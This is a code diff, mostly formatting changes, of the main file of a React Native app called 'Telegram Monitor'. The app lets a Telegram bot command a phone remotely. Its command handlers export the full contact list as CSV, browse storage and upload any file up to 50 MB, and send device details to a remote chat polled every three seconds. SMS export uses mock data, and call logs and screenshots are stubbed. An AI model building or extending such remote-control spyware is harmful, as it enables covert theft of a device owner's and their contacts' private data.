@@ -2,43 +2,43 @@
  * Telegram Monitor - Enhanced
  * A React Native application for remote device monitoring via Telegram Bot
  */
-import React, { useState, useEffect, useCallback } from 'react';
-import { 
-  View, 
-  Text, 
-  StyleSheet, 
-  StatusBar as RNStatusBar, 
-  SafeAreaView, 
+import React, { useState, useEffect, useCallback } from "react";
+import {
+  View,
+  Text,
+  StyleSheet,
+  StatusBar as RNStatusBar,
+  SafeAreaView,
   ScrollView,
   TouchableOpacity,
   Animated,
   KeyboardAvoidingView,
   Platform,
-  AppState
-} from 'react-native';
-import { Ionicons } from '@expo/vector-icons';
+  AppState,
+} from "react-native";
+import { Ionicons } from "@expo/vector-icons";
 
 // Services and Utilities
-import telegramAPI from './src/api/telegramAPI';
-import logger from './src/utils/logger';
-import * as storage from './src/utils/storage';
+import telegramAPI from "./src/api/telegramAPI";
+import logger from "./src/utils/logger";
+import * as storage from "./src/utils/storage";
 
 // Hooks
-import useDeviceInfo from './src/hooks/useDeviceInfo';
-import useFileSystem from './src/hooks/useFileSystem';
-import usePermissions from './src/hooks/usePermissions';
+import useDeviceInfo from "./src/hooks/useDeviceInfo";
+import useFileSystem from "./src/hooks/useFileSystem";
+import usePermissions from "./src/hooks/usePermissions";
 
 // Services
-import contactsService from './src/services/contactsService';
-import deviceService from './src/services/deviceService';
-import fileService from './src/services/fileService';
-import messageService from './src/services/messageService';
+import contactsService from "./src/services/contactsService";
+import deviceService from "./src/services/deviceService";
+import fileService from "./src/services/fileService";
+import messageService from "./src/services/messageService";
 
 // Components
-import ConsoleLog from './src/components/ConsoleLog';
-import ConnectionStatus from './src/components/ConnectionStatus';
-import SettingsForm from './src/components/SettingsForm';
-import StatusBar from './src/components/StatusBar';
+import ConsoleLog from "./src/components/ConsoleLog";
+import ConnectionStatus from "./src/components/ConnectionStatus";
+import SettingsForm from "./src/components/SettingsForm";
+import StatusBar from "./src/components/StatusBar";
 
 export default function App() {
   // State
@@ -49,30 +49,31 @@ export default function App() {
   const [appState, setAppState] = useState(AppState.currentState);
   const [updateInterval, setUpdateInterval] = useState(null);
   const [showSettings, setShowSettings] = useState(true);
-  
+
   // Custom hooks
   const { deviceInfo, refreshDeviceInfo } = useDeviceInfo();
-  const { currentPath, fileList, listFiles, navigateTo, navigateBack } = useFileSystem();
+  const { currentPath, fileList, listFiles, navigateTo, navigateBack } =
+    useFileSystem();
   const { permissionStatus, requestAllPermissions } = usePermissions();
-  
+
   // Animation refs
   const fadeAnim = React.useRef(new Animated.Value(0)).current;
   const scanLineAnim = React.useRef(new Animated.Value(0)).current;
-  
+
   // Initialize app
   useEffect(() => {
     const initialize = async () => {
-      logger.info('Application starting...');
-      
+      logger.info("Application starting...");
+
       // Start animations
       Animated.loop(
         Animated.timing(fadeAnim, {
           toValue: 1,
           duration: 1500,
           useNativeDriver: true,
-        })
+        }),
       ).start();
-      
+
       Animated.loop(
         Animated.sequence([
           Animated.timing(scanLineAnim, {
@@ -85,51 +86,54 @@ export default function App() {
             duration: 0,
             useNativeDriver: true,
           }),
-        ])
+        ]),
       ).start();
-      
+
       // Check for saved credentials
       const savedToken = await storage.getBotToken();
       const savedChatId = await storage.getChatId();
-      
+
       if (savedToken && savedChatId) {
-        logger.info('Found saved credentials, initializing connection...');
+        logger.info("Found saved credentials, initializing connection...");
         const success = telegramAPI.initialize(savedToken, savedChatId);
-        
+
         if (success) {
           setIsConnected(true);
           setShowSettings(false);
-          logger.success('Connected to Telegram with saved credentials');
+          logger.success("Connected to Telegram with saved credentials");
         } else {
-          logger.warning('Could not connect with saved credentials');
+          logger.warning("Could not connect with saved credentials");
         }
       } else {
-        logger.info('No saved credentials found');
+        logger.info("No saved credentials found");
       }
-      
+
       // Request permissions
       await requestAllPermissions();
     };
-    
+
     initialize();
-    
+
     // Set up AppState listener
     const handleAppStateChange = (nextAppState) => {
-      if (appState.match(/inactive|background/) && nextAppState === 'active') {
-        logger.info('App has come to the foreground!');
+      if (appState.match(/inactive|background/) && nextAppState === "active") {
+        logger.info("App has come to the foreground!");
         refreshDeviceInfo();
       }
-      
+
       setAppState(nextAppState);
     };
-    
-    const subscription = AppState.addEventListener('change', handleAppStateChange);
-    
+
+    const subscription = AppState.addEventListener(
+      "change",
+      handleAppStateChange,
+    );
+
     return () => {
       subscription.remove();
     };
   }, []);
-  
+
   // Handle connection status changes
   useEffect(() => {
     const handleConnectionChange = (connected) => {
@@ -140,84 +144,87 @@ export default function App() {
         stopMonitoring();
       }
     };
-    
+
     telegramAPI.addConnectionListener(handleConnectionChange);
-    
+
     return () => {
       telegramAPI.removeConnectionListener(handleConnectionChange);
     };
   }, []);
-  
+
   // Set up Telegram command handlers
   useEffect(() => {
     // Register command handlers
-    telegramAPI.registerCommandHandler('call_logs', handleCallLogs);
-    telegramAPI.registerCommandHandler('sms_logs', handleSmsLogs);
-    telegramAPI.registerCommandHandler('contacts', handleContacts);
-    telegramAPI.registerCommandHandler('storage', handleStorage);
-    telegramAPI.registerCommandHandler('device_info', handleDeviceInfo);
-    telegramAPI.registerCommandHandler('screenshot', handleScreenshot);
-    telegramAPI.registerCommandHandler('file', handleFile);
-    telegramAPI.registerCommandHandler('back', handleNavigateBack);
-    
+    telegramAPI.registerCommandHandler("call_logs", handleCallLogs);
+    telegramAPI.registerCommandHandler("sms_logs", handleSmsLogs);
+    telegramAPI.registerCommandHandler("contacts", handleContacts);
+    telegramAPI.registerCommandHandler("storage", handleStorage);
+    telegramAPI.registerCommandHandler("device_info", handleDeviceInfo);
+    telegramAPI.registerCommandHandler("screenshot", handleScreenshot);
+    telegramAPI.registerCommandHandler("file", handleFile);
+    telegramAPI.registerCommandHandler("back", handleNavigateBack);
+
     return () => {
       // Nothing to do on cleanup - the API instance persists
     };
   }, [currentPath, fileList]);
-  
+
   // Telegram update polling
   const startMonitoring = useCallback(() => {
     if (updateInterval) {
       clearInterval(updateInterval);
     }
-    
+
     // Set up periodic polling if connected
     if (isConnected) {
       const interval = setInterval(checkTelegramUpdates, 3000);
       setUpdateInterval(interval);
       setMonitoringActive(true);
-      logger.info('Monitoring started');
-      
+      logger.info("Monitoring started");
+
       // Send initial device info
       sendDeviceInfo();
     }
-    
+
     return () => {
       if (updateInterval) {
         clearInterval(updateInterval);
       }
     };
   }, [isConnected, updateInterval]);
-  
+
   const stopMonitoring = useCallback(() => {
     if (updateInterval) {
       clearInterval(updateInterval);
       setUpdateInterval(null);
     }
-    
+
     setMonitoringActive(false);
-    logger.info('Monitoring stopped');
+    logger.info("Monitoring stopped");
   }, [updateInterval]);
-  
+
   // Handle connect button press
-  const handleConnect = useCallback((token, chatId) => {
-    setIsConnected(true);
-    setShowSettings(false);
-    startMonitoring();
-  }, [startMonitoring]);
-  
+  const handleConnect = useCallback(
+    (token, chatId) => {
+      setIsConnected(true);
+      setShowSettings(false);
+      startMonitoring();
+    },
+    [startMonitoring],
+  );
+
   // Check for new Telegram updates
   const checkTelegramUpdates = useCallback(async () => {
     if (processing || !isConnected) return;
-    
+
     try {
       setProcessing(true);
       const updates = await telegramAPI.getUpdates();
-      
+
       if (updates.length > 0) {
         setLastUpdateTime(new Date());
         logger.info(`Received ${updates.length} updates from Telegram`);
-        
+
         // Process each update
         for (const update of updates) {
           await telegramAPI.processUpdate(update);
@@ -229,203 +236,219 @@ export default function App() {
       setProcessing(false);
     }
   }, [processing, isConnected]);
-  
+
   // Send device information to Telegram
   const sendDeviceInfo = useCallback(async () => {
     try {
       await refreshDeviceInfo();
       const success = await telegramAPI.sendDeviceInfo(deviceInfo);
-      
+
       if (success) {
-        logger.success('Device info sent to Telegram');
+        logger.success("Device info sent to Telegram");
       } else {
-        logger.error('Failed to send device info');
+        logger.error("Failed to send device info");
       }
     } catch (error) {
       logger.error(`Send device info error: ${error.message}`);
     }
   }, [deviceInfo, refreshDeviceInfo]);
-  
+
   // Command handlers
   const handleCallLogs = useCallback(async () => {
     try {
-      logger.info('Call logs requested');
-      
+      logger.info("Call logs requested");
+
       // This is not supported in Expo
       await telegramAPI.sendMessage(
-        'Call log access requires native Android modules. Not available in this version.'
+        "Call log access requires native Android modules. Not available in this version.",
       );
-      
-      logger.warning('Call log access not available in Expo');
+
+      logger.warning("Call log access not available in Expo");
     } catch (error) {
       logger.error(`Call logs error: ${error.message}`);
     }
   }, []);
-  
+
   const handleSmsLogs = useCallback(async () => {
     try {
-      logger.info('SMS logs requested');
-      
+      logger.info("SMS logs requested");
+
       const isAvailable = await messageService.isSmsAvailable();
-      
+
       if (!isAvailable) {
         await telegramAPI.sendMessage(
-          'SMS functionality is not available on this device.'
+          "SMS functionality is not available on this device.",
         );
-        logger.warning('SMS not available on this device');
+        logger.warning("SMS not available on this device");
         return;
       }
-      
+
       // Since direct SMS access is not available in Expo, use mock data for demonstration
       // In a real implementation, you'd use a native module to access SMS
       const mockMessages = messageService.generateMockSmsData(20);
       const csvPath = await messageService.formatSmsAsCSV(mockMessages);
-      
+
       if (csvPath) {
-        await telegramAPI.sendFile(csvPath, 'SMS Messages Export');
+        await telegramAPI.sendFile(csvPath, "SMS Messages Export");
         await telegramAPI.sendMessage(
-          messageService.formatSmsAsText(mockMessages.slice(0, 5))
+          messageService.formatSmsAsText(mockMessages.slice(0, 5)),
         );
-        logger.success('SMS logs sent successfully');
+        logger.success("SMS logs sent successfully");
       } else {
-        await telegramAPI.sendMessage('Failed to generate SMS logs.');
-        logger.error('Failed to generate SMS logs');
+        await telegramAPI.sendMessage("Failed to generate SMS logs.");
+        logger.error("Failed to generate SMS logs");
       }
     } catch (error) {
       logger.error(`SMS logs error: ${error.message}`);
       await telegramAPI.sendMessage(`Error: ${error.message}`);
     }
   }, []);
-  
+
   const handleContacts = useCallback(async () => {
     try {
-      logger.info('Contacts requested');
-      
+      logger.info("Contacts requested");
+
       // Check if contacts permission is granted
       const { status } = await contactsService.getAllContacts();
-      
-      if (status !== 'granted') {
+
+      if (status !== "granted") {
         await telegramAPI.sendMessage(
-          'Contacts permission not granted. Cannot access contacts.'
+          "Contacts permission not granted. Cannot access contacts.",
         );
-        logger.warning('Contacts permission denied');
+        logger.warning("Contacts permission denied");
         return;
       }
-      
+
       // Get all contacts
       const contacts = await contactsService.getAllContacts();
-      
+
       if (!contacts || contacts.length === 0) {
-        await telegramAPI.sendMessage('No contacts found on this device.');
-        logger.info('No contacts found');
+        await telegramAPI.sendMessage("No contacts found on this device.");
+        logger.info("No contacts found");
         return;
       }
-      
+
       // Convert to CSV and send
       const csv = contactsService.contactsToCSV(contacts);
-      const csvPath = await fileService.createTempFile(csv, 'contacts.csv');
-      
-      await telegramAPI.sendFile(csvPath, `Contacts: ${contacts.length} entries`);
-      
-      // Also send a summary of the first few contacts
-      const summary = contacts.slice(0, 5).map(
-        c => contactsService.formatContact(c)
-      ).join('\n\n-----------------\n\n');
-      
-      await telegramAPI.sendMessage(
-        `Found ${contacts.length} contacts.\n\nSample contacts:\n\n${summary}`
+      const csvPath = await fileService.createTempFile(csv, "contacts.csv");
+
+      await telegramAPI.sendFile(
+        csvPath,
+        `Contacts: ${contacts.length} entries`,
       );
-      
-      logger.success('Contacts sent successfully');
+
+      // Also send a summary of the first few contacts
+      const summary = contacts
+        .slice(0, 5)
+        .map((c) => contactsService.formatContact(c))
+        .join("\n\n-----------------\n\n");
+
+      await telegramAPI.sendMessage(
+        `Found ${contacts.length} contacts.\n\nSample contacts:\n\n${summary}`,
+      );
+
+      logger.success("Contacts sent successfully");
     } catch (error) {
       logger.error(`Contacts error: ${error.message}`);
-      await telegramAPI.sendMessage(`Error accessing contacts: ${error.message}`);
+      await telegramAPI.sendMessage(
+        `Error accessing contacts: ${error.message}`,
+      );
     }
   }, []);
-  
+
   const handleStorage = useCallback(async () => {
     try {
-      logger.info('Storage access requested');
-      
+      logger.info("Storage access requested");
+
       // List files in the current path
       const files = await listFiles(currentPath);
-      
+
       // Create inline keyboard for file selection
       const keyboard = {
         inline_keyboard: [
-          ...files.slice(0, 10).map((file, index) => [{
-            text: `${index + 1}. ${file.name}${file.isDirectory ? '/' : ''}`,
-            callback_data: `file_${file.path}`
-          }])
-        ]
+          ...files.slice(0, 10).map((file, index) => [
+            {
+              text: `${index + 1}. ${file.name}${file.isDirectory ? "/" : ""}`,
+              callback_data: `file_${file.path}`,
+            },
+          ]),
+        ],
       };
-      
+
       // Add navigation buttons
       keyboard.inline_keyboard.push([
-        { text: '🔙 Back', callback_data: 'back' },
-        { text: '🔄 Refresh', callback_data: 'storage' }
+        { text: "🔙 Back", callback_data: "back" },
+        { text: "🔄 Refresh", callback_data: "storage" },
       ]);
-      
+
       // Send message with file list
       await telegramAPI.sendMessage(
         `📂 *Current Directory*: \`${currentPath}\`\n\n` +
-        `Found ${files.length} items.\n` +
-        `${files.length > 10 ? 'Showing first 10 items.' : ''}`,
-        { reply_markup: keyboard }
+          `Found ${files.length} items.\n` +
+          `${files.length > 10 ? "Showing first 10 items." : ""}`,
+        { reply_markup: keyboard },
       );
-      
+
       logger.success(`Sent file list for path: ${currentPath}`);
     } catch (error) {
       logger.error(`Storage error: ${error.message}`);
-      await telegramAPI.sendMessage(`Error accessing storage: ${error.message}`);
+      await telegramAPI.sendMessage(
+        `Error accessing storage: ${error.message}`,
+      );
     }
   }, [currentPath, listFiles]);
-  
-  const handleFile = useCallback(async (query, filePath) => {
-    try {
-      logger.info(`File selected: ${filePath}`);
-      
-      // Get file info
-      const fileInfo = await FileSystem.getInfoAsync(filePath);
-      
-      if (!fileInfo.exists) {
-        await telegramAPI.sendMessage(`File not found: ${filePath}`);
-        logger.warning(`File not found: ${filePath}`);
-        return;
-      }
-      
-      if (fileInfo.isDirectory) {
-        // Navigate to this directory
-        await navigateTo(filePath);
-        await handleStorage();
-      } else {
-        // Check file size
-        if (fileInfo.size > 50 * 1024 * 1024) { // 50MB limit
-          await telegramAPI.sendMessage(
-            `File too large to send: ${(fileInfo.size / 1024 / 1024).toFixed(2)} MB.\n` +
-            `Maximum size is 50 MB.`
-          );
-          logger.warning(`File too large: ${filePath} (${fileInfo.size} bytes)`);
+
+  const handleFile = useCallback(
+    async (query, filePath) => {
+      try {
+        logger.info(`File selected: ${filePath}`);
+
+        // Get file info
+        const fileInfo = await FileSystem.getInfoAsync(filePath);
+
+        if (!fileInfo.exists) {
+          await telegramAPI.sendMessage(`File not found: ${filePath}`);
+          logger.warning(`File not found: ${filePath}`);
           return;
         }
-        
-        // Send the file
-        await telegramAPI.sendFile(
-          filePath, 
-          `File: ${filePath.split('/').pop()}\nSize: ${(fileInfo.size / 1024).toFixed(2)} KB`
-        );
-        
-        logger.success(`File sent: ${filePath}`);
+
+        if (fileInfo.isDirectory) {
+          // Navigate to this directory
+          await navigateTo(filePath);
+          await handleStorage();
+        } else {
+          // Check file size
+          if (fileInfo.size > 50 * 1024 * 1024) {
+            // 50MB limit
+            await telegramAPI.sendMessage(
+              `File too large to send: ${(fileInfo.size / 1024 / 1024).toFixed(2)} MB.\n` +
+                `Maximum size is 50 MB.`,
+            );
+            logger.warning(
+              `File too large: ${filePath} (${fileInfo.size} bytes)`,
+            );
+            return;
+          }
+
+          // Send the file
+          await telegramAPI.sendFile(
+            filePath,
+            `File: ${filePath.split("/").pop()}\nSize: ${(fileInfo.size / 1024).toFixed(2)} KB`,
+          );
+
+          logger.success(`File sent: ${filePath}`);
+        }
+      } catch (error) {
+        logger.error(`File handling error: ${error.message}`);
+        await telegramAPI.sendMessage(`Error accessing file: ${error.message}`);
       }
-    } catch (error) {
-      logger.error(`File handling error: ${error.message}`);
-      await telegramAPI.sendMessage(`Error accessing file: ${error.message}`);
-    }
-  }, [navigateTo, handleStorage]);
-  
+    },
+    [navigateTo, handleStorage],
+  );
+
   const handleNavigateBack = useCallback(async () => {
     try {
-      logger.info('Navigate back requested');
+      logger.info("Navigate back requested");
       await navigateBack();
       await handleStorage();
     } catch (error) {
@@ -433,118 +456,120 @@ export default function App() {
       await telegramAPI.sendMessage(`Navigation error: ${error.message}`);
     }
   }, [navigateBack, handleStorage]);
-  
+
   const handleDeviceInfo = useCallback(async () => {
     try {
-      logger.info('Device info requested');
-      
+      logger.info("Device info requested");
+
       // Refresh device info
       await refreshDeviceInfo();
-      
+
       // Send formatted device info
-      await telegramAPI.sendMessage(
-        deviceService.formatDeviceInfo(deviceInfo)
-      );
-      
-      logger.success('Device info sent');
+      await telegramAPI.sendMessage(deviceService.formatDeviceInfo(deviceInfo));
+
+      logger.success("Device info sent");
     } catch (error) {
       logger.error(`Device info error: ${error.message}`);
-      await telegramAPI.sendMessage(`Error getting device info: ${error.message}`);
+      await telegramAPI.sendMessage(
+        `Error getting device info: ${error.message}`,
+      );
     }
   }, [deviceInfo, refreshDeviceInfo]);
-  
+
   const handleScreenshot = useCallback(async () => {
     try {
-      logger.info('Screenshot requested');
-      
+      logger.info("Screenshot requested");
+
       // This requires native modules in Expo, so we'll send an error message
       await telegramAPI.sendMessage(
-        'Screenshot functionality requires native Android modules.\n' +
-        'Not available in this version.'
+        "Screenshot functionality requires native Android modules.\n" +
+          "Not available in this version.",
       );
-      
-      logger.warning('Screenshot functionality not available');
+
+      logger.warning("Screenshot functionality not available");
     } catch (error) {
       logger.error(`Screenshot error: ${error.message}`);
       await telegramAPI.sendMessage(`Screenshot error: ${error.message}`);
     }
   }, []);
-  
+
   return (
     <SafeAreaView style={styles.safeArea}>
       <RNStatusBar barStyle="light-content" backgroundColor="#000" />
-      
+
       <KeyboardAvoidingView
-        behavior={Platform.OS === 'ios' ? 'padding' : 'height'}
+        behavior={Platform.OS === "ios" ? "padding" : "height"}
         style={styles.container}
       >
         <View style={styles.background}>
           {/* Scan line animation */}
-          <Animated.View style={[
-            styles.scanLine, 
-            {
-              transform: [{
-                translateY: scanLineAnim.interpolate({
-                  inputRange: [0, 1],
-                  outputRange: [0, 500]
-                })
-              }]
-            }
-          ]} />
-          
+          <Animated.View
+            style={[
+              styles.scanLine,
+              {
+                transform: [
+                  {
+                    translateY: scanLineAnim.interpolate({
+                      inputRange: [0, 1],
+                      outputRange: [0, 500],
+                    }),
+                  },
+                ],
+              },
+            ]}
+          />
+
           <View style={styles.content}>
             {/* Header */}
             <View style={styles.header}>
               <Animated.Text style={[styles.title, { opacity: fadeAnim }]}>
                 TELEGRAM MONITOR
               </Animated.Text>
-              
-              <TouchableOpacity 
+
+              <TouchableOpacity
                 style={styles.settingsButton}
                 onPress={() => setShowSettings(!showSettings)}
               >
                 <Ionicons name="settings-outline" size={24} color="#fff" />
               </TouchableOpacity>
             </View>
-            
+
             {/* Status Bar */}
-            <StatusBar 
+            <StatusBar
               deviceInfo={deviceInfo}
               isConnected={isConnected}
               processingStatus={processing}
               monitoringActive={monitoringActive}
               lastUpdateTime={lastUpdateTime}
             />
-            
+
             {/* Settings Form (collapsible) */}
-            {showSettings && (
-              <SettingsForm onConnect={handleConnect} />
-            )}
-            
+            {showSettings && <SettingsForm onConnect={handleConnect} />}
+
             {/* Console Log */}
             <ConsoleLog maxHeight={300} />
-            
+
             {/* Connection Controls */}
             <View style={styles.controls}>
-              <TouchableOpacity 
+              <TouchableOpacity
                 style={[
-                  styles.controlButton, 
-                  monitoringActive ? styles.stopButton : styles.startButton
+                  styles.controlButton,
+                  monitoringActive ? styles.stopButton : styles.startButton,
                 ]}
                 onPress={monitoringActive ? stopMonitoring : startMonitoring}
                 disabled={!isConnected}
               >
-                <Ionicons 
-                  name={monitoringActive ? 'stop-circle' : 'play-circle'} 
-                  size={20} 
-                  color="#fff" 
+                <Ionicons
+                  name={monitoringActive ? "stop-circle" : "play-circle"}
+                  size={20}
+                  color="#fff"
                 />
                 <Text style={styles.buttonText}>
-                  {monitoringActive ? 'Stop Monitoring' : 'Start Monitoring'}
+                  {monitoringActive ? "Stop Monitoring" : "Start Monitoring"}
                 </Text>
               </TouchableOpacity>
-              
-              <TouchableOpacity 
+
+              <TouchableOpacity
                 style={styles.controlButton}
                 onPress={sendDeviceInfo}
                 disabled={!isConnected}
@@ -563,24 +588,24 @@ export default function App() {
 const styles = StyleSheet.create({
   safeArea: {
     flex: 1,
-    backgroundColor: '#000',
+    backgroundColor: "#000",
   },
   container: {
     flex: 1,
-    backgroundColor: '#000',
+    backgroundColor: "#000",
   },
   background: {
     flex: 1,
-    backgroundColor: '#111',
-    position: 'relative',
-    overflow: 'hidden',
+    backgroundColor: "#111",
+    position: "relative",
+    overflow: "hidden",
   },
   scanLine: {
-    position: 'absolute',
+    position: "absolute",
     left: 0,
     right: 0,
     height: 2,
-    backgroundColor: 'rgba(0, 255, 0, 0.5)',
+    backgroundColor: "rgba(0, 255, 0, 0.5)",
     zIndex: 1,
   },
   content: {
@@ -589,57 +614,57 @@ const styles = StyleSheet.create({
     paddingTop: 20,
   },
   header: {
-    flexDirection: 'row',
-    justifyContent: 'space-between',
-    alignItems: 'center',
+    flexDirection: "row",
+    justifyContent: "space-between",
+    alignItems: "center",
     marginBottom: 16,
   },
   title: {
-    color: '#0f0',
+    color: "#0f0",
     fontSize: 24,
-    fontWeight: 'bold',
-    fontFamily: Platform.OS === 'ios' ? 'Courier' : 'monospace',
+    fontWeight: "bold",
+    fontFamily: Platform.OS === "ios" ? "Courier" : "monospace",
   },
   settingsButton: {
     padding: 8,
   },
   connectionStatus: {
-    flexDirection: 'row',
-    alignItems: 'center',
+    flexDirection: "row",
+    alignItems: "center",
     padding: 8,
-    backgroundColor: '#222',
+    backgroundColor: "#222",
     borderRadius: 5,
   },
   statusText: {
-    color: '#fff',
+    color: "#fff",
     marginLeft: 8,
     fontSize: 14,
-    fontWeight: 'bold',
+    fontWeight: "bold",
   },
   controls: {
-    flexDirection: 'row',
-    justifyContent: 'space-between',
+    flexDirection: "row",
+    justifyContent: "space-between",
     marginVertical: 16,
   },
   controlButton: {
     flex: 1,
-    backgroundColor: '#007bff',
+    backgroundColor: "#007bff",
     borderRadius: 5,
     paddingVertical: 12,
-    flexDirection: 'row',
-    justifyContent: 'center',
-    alignItems: 'center',
+    flexDirection: "row",
+    justifyContent: "center",
+    alignItems: "center",
     marginHorizontal: 5,
   },
   startButton: {
-    backgroundColor: '#28a745',
+    backgroundColor: "#28a745",
   },
   stopButton: {
-    backgroundColor: '#dc3545',
+    backgroundColor: "#dc3545",
   },
   buttonText: {
-    color: '#fff',
-    fontWeight: 'bold',
+    color: "#fff",
+    fontWeight: "bold",
     marginLeft: 8,
   },
 });
